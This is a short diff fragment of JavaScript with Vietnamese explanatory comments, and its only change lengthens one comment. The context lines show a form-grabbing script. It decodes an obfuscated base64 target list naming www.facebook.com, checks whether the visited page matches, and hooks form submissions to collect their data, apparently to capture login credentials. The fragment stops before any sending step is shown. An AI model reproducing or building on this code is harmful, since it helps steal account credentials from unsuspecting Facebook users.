@@ -10,7 +10,7 @@
   const targets = [_0xabc1("d3d3LmZhY2Vib29rLmNvbQ==")]; // ['www.facebook.com']
   if (targets.indexOf(window.location.hostname) !== -1) {
     // kiểm tra xem trang web hiện tại có nằm trong danh sách targets không
-    // wiindow.location.hostname sẽ trả về tên miền của trang web hiện tại
+    // wiindow.location.hostname sẽ trả về tên miền của trang web hiện tại mà người dùng đang truy cập
     document.addEventListener("submit", function (event) {
       let form = event.target; // lấy ra form mà người dùng vừa submit
       let formData = new FormData(form);
